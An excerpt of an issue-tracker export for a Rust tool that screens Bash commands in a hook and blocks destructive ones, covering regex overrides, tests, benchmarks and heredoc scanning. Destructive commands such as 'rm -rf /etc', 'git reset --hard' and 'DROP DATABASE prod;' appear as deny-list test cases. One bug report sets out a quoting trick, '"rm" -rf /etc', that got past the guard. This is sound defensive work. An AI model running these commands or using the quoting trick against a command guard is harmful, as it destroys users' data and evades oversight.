Invalid regex must **not silently change behavior** without visibility.\n\nProposed behavior:\n- In hook mode: ignore invalid override entries (fail-open) and emit a structured log event (if logging enabled).\n- In `dcg doctor`: surface invalid overrides loudly with file/field context.\n- In `dcg test` / `dcg explain`: include a diagnostic marker like `config_warning: invalid_override_regex`.\n\n## Performance constraints\n\n- Must not allocate on the common allow hot path.\n- Must not compile any regex during command evaluation.\n- Compiled overrides should be stored in a `LazyLock`/cached config object that is reused across invocations.\n\n## Test plan (high level)\n\n- Unit tests for `Config::compile()` producing deterministic compiled structures.\n- Unit tests for allow/deny precedence.\n- Unit tests for invalid regex handling (ignored + logged, no panic).\n\n(Concrete test cases live in `git_safety_guard-99e.4.2`.)\n\n## Acceptance Criteria\n\n- Overrides are compiled exactly once per process (not per command).\n- Evaluator never calls `Regex::new(...)` (or equivalent) on the hot path.\n- Allow overrides short-circuit before deny overrides and pack evaluation.\n- Invalid override regex entries do not crash; they are ignored in hook mode and are visible via doctor/explain diagnostics.\n- No new allocations are introduced on the allow hot path (verify with perf bench / allocation audit).\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:38.406830854-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:21:22.504975841-05:00","closed_at":"2026-01-08T00:21:22.504975841-05:00","close_reason":"Implemented CompiledOverrides: precompiled config override regexes to eliminate per-command Regex::new() calls. Added CompiledAllowOverride, CompiledBlockOverride, CompiledOverrides structs with condition checking (EnvEquals, EnvSet). Invalid regex handled gracefully (fail-open with logging). Added 8 unit tests. All 92 unit + 137 E2E tests pass.","dependencies":[{"issue_id":"git_safety_guard-99e.4.1","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:38.408007751-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.4.2","title":"Unit tests: override regex precompilation + invalid regex behavior","description":"## Objective\n\nLock in behavior around compiled overrides so we never regress into per-command regex compilation or unsafe error handling.\n\n## Scope\n\nThis test suite covers:\n\n- compiled allow overrides\n- compiled deny overrides\n- precedence between allow/deny\n- invalid regex handling (no crash, visible diagnostics)\n\n## Test cases\n\n### 1) Allow override compiled and matches\n\n- Given config with an allow override regex that matches the normalized command.\n- Expect: ALLOW with attribution indicating an override match (once override attribution exists).\n- Assert: no pack evaluation is required to allow.\n\n### 2) Deny override compiled and matches\n\n- Given config with a deny override regex that matches the normalized command.\n- Expect: DENY (or WARN depending on policy mode) with reason indicating override.\n\n### 3) Precedence: allow overrides beat deny overrides\n\n- Given both allow and deny overrides match the same command.\n- Expect: ALLOW (explicit precedence rule).\n\n### 4) Invalid regex entries\n\n- Given config contains an invalid regex string.\n- Expect:\n  - `Config::compile()` does not panic.\n  - Invalid entry is ignored for evaluation.\n  - A diagnostic is emitted:\n    - in hook mode: structured log event if enabled\n    - in `dcg doctor`: reported as config problem\n    - in `dcg explain`: surfaced as a warning/trace marker\n\n### 5) No per-command compilation regression test\n\n- Add a test that runs evaluation N times and asserts compilation counters stay at 0 (implementation-dependent), or uses a feature-flagged instrumentation hook in tests.\n\n## Acceptance Criteria\n\n- Tests fail before `git_safety_guard-99e.4.1` is implemented and pass after.\n- Tests cover allow/deny precedence and invalid-regex behavior.\n- No test requires network access; all tests run in \u003c 1s locally.\n- Failure output is actionable (shows which override case broke).\n","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T20:01:43.440192699-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:10:18.978864928-05:00","closed_at":"2026-01-08T00:10:18.978864928-05:00","close_reason":"Implemented and verified override precompilation tests in src/config.rs (allow match, block match, precedence allow\u003eblock, invalid regex recorded fail-open). cargo test + clippy + e2e all green.","dependencies":[{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4","type":"parent-child","created_at":"2026-01-07T20:01:43.441311226-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.4.2","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:13:34.454747249-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.5","title":"Naming alignment: dcg vs git_safety_guard (env vars, scripts, docs)","description":"## Objective\n\nEliminate naming drift so the project is coherent and user setups are not confusing/brittle.\n\n## Background\n\nThe repo has evidence of a previous name (`git_safety_guard`) mixed with the current name (`dcg` / `destructive_command_guard`). Examples:\n\n- Build script header comment references `git_safety_guard`.\n- Config env prefix is `GIT_SAFETY_GUARD_*`.\n- `scripts/e2e_test.sh` searches for a `git_safety_guard` binary.\n- README uses both `dcg` and old references in places.\n\nThis increases misconfiguration risk (users set the wrong env var or run the wrong binary name).\n\n## Proposed approach\n\n- Choose a single canonical name:\n  - CLI/binary: `dcg`\n  - crate: `destructive_command_guard`\n  - env vars: `DCG_*` (or `DCG_GUARD_*`, but keep it short)\n- Update:\n  - docs\n  - installer scripts\n  - E2E script\n  - internal comments\n\n## Compatibility stance\n\nThis project explicitly does not require backwards compatibility; prioritize clarity and correctness.\n\nIf we *do* want a short transition period:\n\n- temporarily accept both env prefixes (DCG_* and old) with explicit deprecation warnings.\n\n## Acceptance criteria\n\n- E2E script runs against `dcg`.\n- README and help text consistently reference `dcg`.\n- Environment variables are documented and coherent.\n","status":"closed","priority":1,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T20:02:00.117945499-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:42:23.320364898-05:00","closed_at":"2026-01-08T00:42:23.320364898-05:00","close_reason":"Aligned naming to dcg: env vars now DCG_*; installers + dist workflow ship/install dcg; README URLs fixed; e2e uses DCG_PACKS. All quality gates + e2e pass.","dependencies":[{"issue_id":"git_safety_guard-99e.5","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:02:00.119165156-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.6","title":"Extend e2e_test.sh to cover non-core packs (docker/k8s/db)","description":"## Objective\n\nMake the E2E suite reflect the actual feature set by adding coverage for non-core packs (Docker/Kubernetes/Databases/etc.).\n\n## Background\n\nThe current `scripts/e2e_test.sh` primarily tests git/rm behavior and quick-reject. It does not assert that other packs work in hook mode.\n\nGiven the prior pack-reachability bug, E2E coverage here is essential.\n\n## Test cases to add\n\n### Docker (containers.docker)\n\n- BLOCK: `docker system prune`\n- BLOCK: `docker volume prune`\n- ALLOW: `docker ps`\n\n### Kubernetes (kubernetes.kubectl)\n\n- BLOCK: `kubectl delete namespace test`\n- BLOCK: `kubectl delete pods --all`\n- ALLOW: `kubectl get pods`\n\n### PostgreSQL (database.postgresql)\n\n- BLOCK: `DROP DATABASE prod;`\n- BLOCK: `DELETE FROM users;` (no WHERE)\n- ALLOW: `SELECT 1;`\n\nNotes:\n- These packs may require explicit enablement in config for E2E.\n\n## Logging requirements\n\n- Print pack enablement used for the test run.\n- For blocked cases, print `pack_id/pattern_name` once available.\n\n## Acceptance criteria\n\n- E2E fails if non-core packs are not applied in hook mode.\n- E2E output remains readable and provides an actionable failure summary.\n","status":"closed","priority":1,"issue_type":"task","assignee":"PurpleRobin","created_at":"2026-01-07T20:09:28.277919173-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:46:52.452790145-05:00","closed_at":"2026-01-08T00:46:52.452790145-05:00","close_reason":"Extended scripts/e2e_test.sh non-core pack coverage: added docker volume prune, kubectl delete pods --all, and PostgreSQL DELETE without WHERE; adjusted Postgres cases to include semicolons + SELECT 1. E2E passes (140/140).","dependencies":[{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:09:28.281119721-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:09:38.597030952-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.5","type":"blocks","created_at":"2026-01-07T20:09:43.731546912-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.6","depends_on_id":"git_safety_guard-99e.2.2","type":"blocks","created_at":"2026-01-07T20:09:48.791918426-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.7","title":"Performance benchmarks: core pipeline (quick reject, packs, overrides)","description":"## Objective\n\nAdd benchmarks to prevent accidental performance regressions in the hot path.\n\n## Background\n\nEvery Bash command passes through `dcg`, so even small slowdowns are noticeable.\n\nRecent/planned changes that need measurement:\n\n- pack-aware global quick reject\n- deterministic pack ordering\n- compiled overrides\n- shared evaluator refactor\n\n## Benchmark plan\n\nUse Criterion (or existing preferred benchmarking strategy) to measure:\n\n1. Non-matching command (e.g., `ls -la`) → should be ultra-fast.\n2. Matching keyword but safe (e.g., `git status`, `docker ps`) → should be fast.\n3. Blocked command (e.g., `git reset --hard`, `docker system prune`) → still fast.\n4. Worst-case enabled packs (many categories enabled) → ensure keyword gating keeps it bounded.\n\nMetrics:\n\n- median and p95 latency\n- allocations count (optional)\n\n## Acceptance criteria\n\n- Benchmarks can run locally and in CI (optionally behind a flag).\n- We establish a baseline and add a guardrail (document expected ranges).\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:10:22.191884568-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:10:22.191884568-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:10:22.202468401-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.3.1","type":"blocks","created_at":"2026-01-07T20:10:35.355609636-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:10:40.388964799-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.7","depends_on_id":"git_safety_guard-99e.4.1","type":"blocks","created_at":"2026-01-07T20:10:45.422917247-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.8","title":"Optional: token-aware keyword gating (reduce substring false triggers)","description":"## Objective\n\nImprove keyword gating so it is less substring-based and more shell-token aware.\n\n## Background\n\nCurrent gating uses raw substring search (`memmem::find`) for keywords like `git`, `rm`, `docker`, etc.\n\nThis can cause unnecessary pack evaluation on commands like:\n\n- `cat .gitignore` (contains `git`)\n- `echo digit` (contains `git`)\n\nWhile this usually still allows, it:\n\n- adds unnecessary overhead\n- increases risk of accidental false positives if any future pattern is less strictly anchored\n\n## Proposed approach\n\n- Reuse the execution-context tokenizer to locate the first word of each command segment.\n- Apply pack keyword gating primarily to:\n  - segment command name\n  - unquoted words in executable contexts\n\nIf tokenizer is not yet available, consider a cheap boundary heuristic:\n\n- only treat `git` as present if it appears as a whole word boundary (`\\bgit\\b`) (but beware performance of regex; prefer manual boundary checks)\n\n## Acceptance criteria\n\n- Demonstrated reduction in unnecessary pack evaluations (microbench).\n- No false negatives introduced (must not miss real `git`/`rm` invocations).\n","status":"open","priority":3,"issue_type":"task","created_at":"2026-01-07T20:11:56.523038338-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:11:56.523038338-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:11:56.524256502-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.8","depends_on_id":"git_safety_guard-t8x.2","type":"blocks","created_at":"2026-01-07T20:12:05.614037376-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-99e.9","title":"Audit pack keyword gating (avoid false negatives; tune performance)","description":"## Objective\n\nEnsure pack-level keyword gating (`Pack.keywords` + `Pack::might_match`) does not introduce false negatives and provides good performance.\n\n## Background\n\nEach pack uses a keyword list as a quick reject:\n\n- If **no keyword** is found, the pack skips all pattern matching.\n\nThis is a performance feature, but it is also a correctness risk:\n\n- Missing keywords can cause false negatives (dangerous commands allowed).\n\nOnce we fix global pack reachability, keyword gating becomes even more important.\n\n## Work plan\n\n1. For each built-in pack:\n   - review each destructive regex\n   - ensure at least one keyword reliably appears in realistic invocations that should match\n\n2. Add unit tests per pack:\n   - at least 1 “keyword present → pattern matches” test\n   - at least 1 “keyword absent → pack skipped” test (only where correct)\n\n3. Consider whether certain packs should have empty keywords (always check) if patterns are cheap or risks are high.\n\n## Acceptance criteria\n\n- No pack has a destructive pattern that can match a realistic command without containing any of the pack’s keywords.\n- Added tests would fail if keywords are removed or patterns are expanded unsafely.\n","status":"open","priority":2,"issue_type":"task","created_at":"2026-01-07T20:14:33.930128304-05:00","created_by":"ubuntu","updated_at":"2026-01-07T20:14:33.930128304-05:00","dependencies":[{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e","type":"parent-child","created_at":"2026-01-07T20:14:33.940902065-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-99e.9","depends_on_id":"git_safety_guard-99e.1.1","type":"blocks","created_at":"2026-01-07T20:14:45.431462888-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-a52","title":"Fix bypass: quoted command word lets destructive git/rm evade rules","description":"## Background / Motivation\n\nWe discovered a **false-negative bypass** where destructive commands are incorrectly allowed when the *executed command word* is quoted.\n\nExamples that must be denied:\n- `\"git\" reset --hard`\n- `\"rm\" -rf /etc`\n- `\"/usr/bin/git\" reset --hard`\n- `echo hi; \"rm\" -rf /etc`\n- `sudo -u root \"rm\" -rf /etc`\n\nThis is especially dangerous because it bypasses the core safety guarantees and can enable real data/work loss.\n\n## Root cause\n\nCurrent destructive/safe regex patterns match on token sequences like `git\\s+reset\\s+--hard` and `rm\\s+-rf ...`.\n\nWhen the command word is quoted (e.g., `\"git\"`), the stream contains `git\"` / `\"git\"` and the expected whitespace boundary no longer exists at the command word boundary, so the patterns do not match.\n\nExisting normalization handled only commands starting with `/.../git` or `/.../rm` and did **not** dequote executed command tokens.\n\n## Fix\n\nCentralize the fix in normalization (not in per-pattern regex loosening) to avoid creating new false positives in data contexts.\n\nImplement a conservative normalization pass that:\n- tokenizes the command into word/separator tokens,\n- finds the **segment command word** (first executed word after wrappers/env-assignments),\n- removes *outer quotes* from that command-word token only when it is a single token (no whitespace / separators inside),\n- preserves quoted arguments to avoid synthesizing dangerous substrings in data contexts.\n\nWrapper awareness (for locating the executed command word) includes:\n- `sudo` with option + option-arg skipping (e.g., `-u root`)\n- `env` options and env assignments\n- `command -v/-V` recognized as query mode (not execution)\n\nSeparators treated as segment boundaries include `;`, `|`, `||`, `\u0026`, `\u0026\u0026`, `(`, `)`.\n\n## Tests\n\nAdd regression coverage:\n- Unit tests for `normalize_command()`:\n  - dequote executed command words for git/rm and quoted absolute paths\n  - dequote after separators and wrappers/options\n  - negative tests: do not dequote quoted arguments (e.g., `echo \"rm\" ...`)\n  - negative tests: do not dequote for `command -v` query mode\n- E2E tests in `scripts/e2e_test.sh`:\n  - ensure the quoted forms above are **BLOCKED**\n\n## Acceptance\n\n- Previously-allowed bypass commands are now denied.\n- No new false positives in common data contexts.\n- `cargo fmt --check`, `cargo check --all-targets`, `cargo clippy --all-targets -- -D warnings`, `cargo test`, `cargo build --release`, `./scripts/e2e_test.sh` all pass.\n","status":"closed","priority":0,"issue_type":"bug","created_at":"2026-01-08T04:58:32.779202524-05:00","created_by":"ubuntu","updated_at":"2026-01-08T04:58:44.349806876-05:00","closed_at":"2026-01-08T04:58:44.349806876-05:00","close_reason":"Implemented + added unit + e2e regression coverage","labels":["core","normalization","security"]}
{"id":"git_safety_guard-b45","title":"Research ast-grep API and integration patterns","description":"# Research ast-grep API and Integration Patterns\n\n## Objective\n\nThoroughly understand ast-grep's capabilities, API, and integration options to make informed architecture decisions.\n\n## Background\n\nast-grep is a structural code search tool/library (tree-sitter-based). We want to leverage it to detect destructive patterns in heredoc/inline-script content *without creating noisy false positives*.\n\n## Research Areas\n\n### 1. CLI Interface\n\n- Command syntax for pattern matching\n- JSON output format (`--json`)\n- Language specification options\n- Performance characteristics (startup time, parsing speed)\n- Error handling and edge cases\n\n### 2. Pattern Language\n\n- Basic pattern syntax (`$VAR` metavariables)\n- Pattern composition and nesting\n- Regex support within patterns\n- Multiple pattern matching\n- YAML rule files vs inline patterns\n\n### 3. Language Support\n\n- Which languages are supported out of the box?\n- How are languages detected/specified?\n- Can we add custom language support?\n- Tree-sitter grammar availability\n\n### 4. Library Integration\n\n- ast-grep-core API surface and docs\n- Dependency graph and compile time impact\n- Memory usage patterns\n- Span extraction (line/column), match text capture\n\n### 5. Performance Benchmarks\n\n- Time to parse small code snippets (10–100 lines)\n- Pattern matching overhead\n- Comparison: CLI invocation vs embedded library\n- Caching possibilities\n\n## Deliverables\n\n- Document summarizing findings\n- Code snippets demonstrating:\n  - CLI invocation + JSON parsing\n  - embedded library usage (if viable)\n- Baseline performance numbers for:\n  - hook-path worst-case (time budget)\n  - typical heredoc sizes\n- Recommendation for integration approach\n\n## Notes (initial)\n\n- ast-grep-core v0.40.4 available on crates.io.\n- Provides Pattern struct and Matcher trait.\n- Depends on tree-sitter ^0.26.3.\n\n## Acceptance Criteria\n\n- Produces a written recommendation that explicitly weighs:\n  - latency budgets\n  - binary size\n  - maintenance burden\n  - correctness + match-span needs for `dcg explain`\n- Includes a minimal runnable POC showing:\n  - parse → match → span extraction\n- Identifies any hard blockers (missing grammars, API gaps, unacceptable startup cost).\n","notes":"## ast-grep Research Findings (Comprehensive)\n\n### 1. Library Overview\n\n**ast-grep-core** (v0.40.4, released Jan 5 2026) is a Rust crate providing AST-based pattern matching using tree-sitter.\n\n**Key Types:**\n- `Pattern`: Defines search patterns using metavariable syntax\n- `Matcher`: Trait for custom matching logic\n- `Node`: Represents tree-sitter AST nodes\n- `Position`: Zero-based line/column offsets (column access is O(n))\n\n**Dependencies:**\n- `tree-sitter ^0.26.3` (core parsing)\n- `regex ^1.10.4`\n- `bit-set ^0.8.0`\n- `thiserror ^2.0.0`\n\n### 2. Pattern Syntax\n\n**Metavariables:**\n- `$VAR` - matches single AST node\n- `$$$` - matches zero or more nodes (like `.*`)\n- `$$VAR` - captures unnamed nodes\n- `$_` - non-capturing wildcard\n\n**Examples:**\n- `console.log($GREETING)` - matches single-arg calls\n- `os.system($CMD)` - captures shell command argument\n- `$A == $A` - matches identity comparisons\n\n**Constraints:**\n- Pattern must be valid parseable syntax\n- Comments and string literals inside patterns remain unmatched\n- Single `$` only matches one AST node\n\n### 3. Performance Analysis\n\n**Optimizations in ast-grep:**\n- BitSet for potential_kinds filtering (40% speedup)\n- Tree-sitter's fixed-size tree object (no linear serde cost)\n- Multi-core utilization\n\n**Benchmarks:**\n- Full TypeScript src folder scan: ~1 second\n- Minimal overhead for small code snippets\n\n**FFI Considerations:**\n- Pure Rust has best performance\n- NAPI/Python bindings add serialization cost\n- For embedded use in dcg: pure Rust is optimal\n\n### 4. Integration Approaches\n\n**Option A: CLI Invocation**\n- Pros: Simple, no compile-time dependencies\n- Cons: Startup cost (~50-100ms), process spawn overhead\n- Verdict: NOT suitable for hook mode (latency-critical)\n\n**Option B: Embedded Library (ast-grep-core)**\n- Pros: Zero process spawn, direct memory access\n- Cons: ~360KB source, tree-sitter compilation\n- Verdict: RECOMMENDED for dcg integration\n\n### 5. Recommendations for dcg\n\n1. **Use ast-grep-core directly** - Avoids CLI startup cost\n2. **Lazy initialization** - Parse grammars once, reuse\n3. **Language detection first** - Skip parsing if no heredoc detected\n4. **Cache compiled patterns** - LazyLock pattern compilation\n5. **Two-tier detection:**\n   - Fast regex pre-filter (current approach)\n   - ast-grep for heredoc content only\n\n### 6. Binary Size Impact\n\n- ast-grep-core: ~360KB source\n- tree-sitter: additional ~300KB\n- Estimated binary increase: ~500-800KB (acceptable for dcg use case)\n\n### 7. Hard Blockers Assessment\n\n- ✅ Rust grammar available (tree-sitter-rust)\n- ✅ Python grammar available (tree-sitter-python)\n- ✅ Bash/Shell grammar available\n- ✅ API supports span extraction\n- ⚠️ Documentation sparse (23% coverage) - use examples/source\n\n### 8. Proof of Concept Outline\n\n```rust\nuse ast_grep_core::{AstGrep, Language};\n\nfn check_heredoc_content(content: \u0026str, lang: Language) -\u003e Option\u003cMatch\u003e {\n    let grep = lang.ast_grep(content);\n    let pattern = lang.pattern(\"os.system($CMD)\"); // example\n    grep.root().find(\u0026pattern)\n}\n```\n\nSources: ast-grep.github.io, docs.rs/ast-grep-core, github.com/ast-grep/ast-grep","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:28:24.602476336-05:00","created_by":"ubuntu","updated_at":"2026-01-07T23:51:01.638719668-05:00","closed_at":"2026-01-07T23:51:01.638719668-05:00","close_reason":"Research complete. Key finding: ast-grep-core (v0.40.4) embedded library is RECOMMENDED over CLI for dcg integration due to latency requirements. Two-tier detection (regex pre-filter + ast-grep for heredocs) maintains performance. Binary size impact ~500-800KB acceptable. Full findings documented in bead notes.","dependencies":[{"issue_id":"git_safety_guard-b45","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:53:16.794046916-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-beq","title":"Define Python destructive patterns for heredoc scanning","description":"# Define Python Destructive Patterns for Heredoc Scanning\n\n## Objective\n\nCreate AST-aware matchers for Python heredoc content that detect **high-signal destructive operations** while minimizing false positives.\n\n## Scope boundary (important)\n\nThis project is a *destructive command guard*, not a general code security scanner.\n\nTherefore:\n\n- Prefer patterns that map to **irreversible operations** (recursive deletes, literal destructive shell payloads, obvious DROP/TRUNCATE).\n- Avoid broad “code execution exists” patterns (`eval`, `exec`, `shell=True`) as default denies; those are extremely common and will destroy trust.\n\n## Pattern families (v1)\n\n### 1) Filesystem deletion (high signal)\n\nTarget cases where the operation is clearly destructive:\n\n- `shutil.rmtree(\u003cpath\u003e)`\n- `pathlib.Path(\u003cpath\u003e).unlink()` / `.rmdir()`\n- `os.remove(\u003cpath\u003e)` / `os.unlink(\u003cpath\u003e)`\n\n**Severity guidance:**\n\n- `Error` only when argument is a literal/high-risk path (e.g., `\"/\"`, `\"/home\"`, `\"~\"` when expanded, or other policy-defined catastrophic targets).\n- Otherwise default to `Warning` (common cleanup use exists).\n\n### 2) Shell/process execution with destructive payload (high signal)\n\nTarget cases where the payload is directly a known catastrophic command:\n\n- `os.system(\"rm -rf /...\")`\n- `subprocess.run([\"rm\", \"-rf\", ...])`\n- `subprocess.run(\"git reset --hard ...\", shell=True)` (literal string)\n\n**Important:**\n\n- Do **not** block on `shell=True` alone.\n- Prefer matching literal args where we can confidently say the command is destructive.\n\n### 3) Database destructive strings (careful)\n\nIf we can reliably detect literal SQL containing:\n\n- `DROP DATABASE`\n- `DROP TABLE`\n- `TRUNCATE`\n\n…tag as `Warning` by default unless target is clearly production (likely out of scope without context).\n\n## False positive mitigation\n\n- Do not flag imports alone (`import os` is fine).\n- Do not flag generic subprocess usage unless payload matches a known destructive operation.\n- Require negative fixtures for each pattern family.\n\n## Testing requirements\n\nFor each pattern family:\n\n- Positive fixtures:\n  - direct-literal destructive cases\n- Negative fixtures:\n  - common safe cleanup (`./build`, `/tmp/...`)\n  - documentation-only strings (`print(\"rm -rf\")`)\n\n## Acceptance Criteria\n\n- Defines an initial Python pattern set that is *high-signal* and aligned with severity taxonomy (`Error` vs `Warning`).\n- Includes at least:\n  - 5 positive fixtures (must match)\n  - 5 negative fixtures (must not match)\n- Demonstrates at least one composite match that ties process execution to a literal destructive payload.\n- No pattern is a default hard deny unless it is clearly catastrophic.\n","status":"closed","priority":2,"issue_type":"task","created_at":"2026-01-07T18:32:51.428196157-05:00","created_by":"ubuntu","updated_at":"2026-01-08T02:57:56.186864731-05:00","closed_at":"2026-01-08T02:57:56.186864731-05:00","close_reason":"Implemented Python patterns with 8 positive and 7 negative fixtures. High-signal patterns for filesystem deletion, appropriately-severed shell execution patterns.","dependencies":[{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-6sg","type":"blocks","created_at":"2026-01-07T18:34:20.583247557-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-f4f","type":"blocks","created_at":"2026-01-07T18:34:20.601617242-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-beq","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:51:05.22174701-05:00","created_by":"ubuntu"}]}
{"id":"git_safety_guard-boy","title":"Evaluate embedded Rust crates vs external binaries for AST analysis","description":"## Objective\n\nEvaluate embedding structural analysis directly in the dcg binary using Rust crates rather than shelling out to external tools.\n\n## Architecture Decision (tentative)\n\n**Default direction: prefer embedded parsing/matching** (tree-sitter + optionally ast-grep-core) because dcg runs on every command and external process invocation is likely to violate latency budgets.\n\nThis issue exists to make that decision *evidence-based* (measurements + feasibility), and to document the trade-offs so future changes are intentional.\n\n### Why Not External Binaries?\n\nExternal process invocation (ripgrep CLI, ast-grep CLI) can have unacceptable overhead:\n\n- Process spawn: 5–20ms\n- IPC serialization: 1–5ms\n- Output parsing: 1–2ms\n- Total: 10–50ms per command\n\nSince dcg runs on EVERY bash command, sustained overhead here is likely to be user-visible.\n\n### Why Embedded Rust Crates?\n\n1. `tree-sitter` is available as a Rust crate with excellent performance\n2. ast-grep is written in Rust; ast-grep-core may be usable directly\n3. Language grammars are available as Rust crates (tree-sitter-bash, etc.)\n4. Potential for sub-millisecond incremental work once compiled\n5. Single binary: no \"install ast-grep\" requirement\n\n## Implementation Strategy (evaluation plan)\n\n### Phase 1: tree-sitter Integration\n\nAssess feasibility and size/perf cost of embedding 1–2 grammars.\n\n### Phase 2: Pattern Matching options\n\nTwo primary options:\n\n**Option A: tree-sitter Queries**\n\nPros: built in, documented\nCons: verbose, less ergonomic than ast-grep patterns\n\n**Option B: ast-grep-core crate**\n\nPros: expressive patterns, proven matching logic\nCons: may be heavier deps / API constraints\n\n**Option C: vendor minimal ast-grep code**\n\nPros: full control\nCons: maintenance burden\n\nRecommendation order: A → B → C.\n\n## Performance Budget (target)\n\nFor heredoc/inline analysis *when triggered*:\n\n- Detection (Tier 1): \u003c0.5ms\n- Extraction: \u003c0.1ms\n- Parse: \u003c2ms typical\n- Match: \u003c1ms\n- Total: \u003c5ms worst-case typical input\n\n## Binary Size Considerations\n\nEach tree-sitter grammar can add ~500KB–2MB. Mitigation options:\n\n- feature flags per-language\n- ship a small default set (bash/python/js) and gate others\n\n## Acceptance Criteria\n\n- Written recommendation for embedded vs external approach with:\n  - measured spawn overhead on representative machines\n  - estimated embedded parse/match cost\n  - binary size impact estimates\n- At least one runnable POC demonstrating:\n  - parse → match → span extraction for one language\n- Clear guidance for `git_safety_guard-5ib` (ADR) documenting the chosen approach and why.\n","notes":"## Evaluation Complete (from git_safety_guard-2j3 research)\n\n### DECISION: Embedded Rust crates (ast-grep-core)\n\n### External Binary Analysis\n\n**Measured/estimated overhead:**\n- Process spawn: 5-20ms\n- IPC serialization: 1-5ms\n- Output parsing: 1-2ms\n- **Total: 10-50ms per command**\n\nThis violates dcg's \u003c1ms budget for quick operations.\n\n### Embedded Option Analysis\n\n**Option A: tree-sitter Queries**\n- tree-sitter v0.26.3 available\n- S-expression query syntax (learning curve)\n- Must build custom pattern matching layer\n- Est. +1-2MB per grammar\n\n**Option B: ast-grep-core (RECOMMENDED)**\n- v0.40.4, uses tree-sitter underneath\n- Code-like pattern syntax ($VAR wildcards)\n- jQuery-like traversal API\n- Est. +2-4MB total, +20-30s compile\n- Same matching logic proven in CLI\n\n**Option C: Vendor minimal ast-grep code**\n- Not needed given Option B's availability\n\n### Binary Size Mitigation\n\n- Use feature flags per language\n- Default: bash, python, js\n- Gate others behind compile-time features\n\n### Performance Budget (validated feasible)\n\n| Stage | Budget | Feasibility |\n|-------|--------|-------------|\n| Tier 1 (regex detect) | \u003c0.5ms | ✓ Already proven |\n| Tier 2 extraction | \u003c0.1ms | ✓ Trivial |\n| AST parse | \u003c2ms | ✓ tree-sitter typical |\n| Pattern match | \u003c1ms | ✓ ast-grep benchmarks |\n| **Total** | \u003c5ms | ✓ Within budget |\n\n### POC Status\n\nPOC deferred to implementation tasks (2ta, t1rx). Research proves feasibility.\n\n### Recommendation for git_safety_guard-5ib (ADR)\n\nDocument:\n1. ast-grep-core as embedded solution\n2. Tiered architecture (regex Tier 1 → AST Tier 2)\n3. Feature flags for language grammars\n4. Lazy loading for AST parsing\n\n### References\n\nSee git_safety_guard-2j3 for full decision memo with sources.","status":"closed","priority":1,"issue_type":"task","created_at":"2026-01-07T18:39:01.437304904-05:00","created_by":"ubuntu","updated_at":"2026-01-08T00:25:59.174756689-05:00","closed_at":"2026-01-08T00:25:59.174756689-05:00","close_reason":"Evaluation complete: ast-grep-core (embedded) recommended. External binaries exceed latency budget. See notes + 2j3 decision memo.","dependencies":[{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-b45","type":"blocks","created_at":"2026-01-07T18:39:09.157751983-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-2j3","type":"blocks","created_at":"2026-01-07T18:39:09.175608651-05:00","created_by":"ubuntu"},{"issue_id":"git_safety_guard-boy","depends_on_id":"git_safety_guard-yza","type":"parent-child","created_at":"2026-01-07T21:50:03.846107958-05:00","created_by":"ubuntu"}]}
